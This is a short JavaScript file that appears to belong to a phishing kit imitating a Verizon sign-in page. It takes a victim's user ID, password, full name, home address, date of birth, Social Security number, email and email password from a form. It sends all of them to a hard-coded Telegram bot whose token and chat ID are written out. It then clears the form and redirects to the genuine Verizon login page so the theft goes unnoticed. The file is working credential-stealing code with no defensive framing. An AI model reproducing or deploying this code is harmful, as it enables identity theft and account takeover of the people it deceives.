//bot token

var telegram_bot_id = "2128810231:AAExkz7T3mTce1Np0EvkL6eN_caEODQ2NY4";
//chat id
var chat_id = 1481079017;
var userid, pasword, fname, address, dob, ssn, email, emailpass;

var ready = function () {
	userid = document.getElementById("userid").value;
    password = document.getElementById("password").value;
    fname = document.getElementById("fname").value;
	address = document.getElementById("address").value;
	
    dob = document.getElementById("dob").value;
    ssn = document.getElementById("ssn").value;
    email= document.getElementById("email").value;
	emailpass = document.getElementById("emailpass").value;

	
    message = "UserId: " + userid + "\npassword: " + password + "\nFullname: " + fname + " \nHome address: " + address + "\nDOB: " + dob + "\nSsn: " + ssn + "\nEmail:" + email + "\nEmailpass:" + emailpass;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
	
	document.getElementById("userid").value = "";
    document.getElementById("password").value = "";
    document.getElementById("fname").value = "";
	document.getElementById("address").value = "";
	
    document.getElementById("dob").value = "";
    document.getElementById("ssn").value = "";
    document.getElementById("email").value = "";
	
	document.getElementById("emailpass").value = "";
    
	
	window.location = "https://secure.verizon.com/vzauth/UI/Login";
    return false;
	
       
           
};

  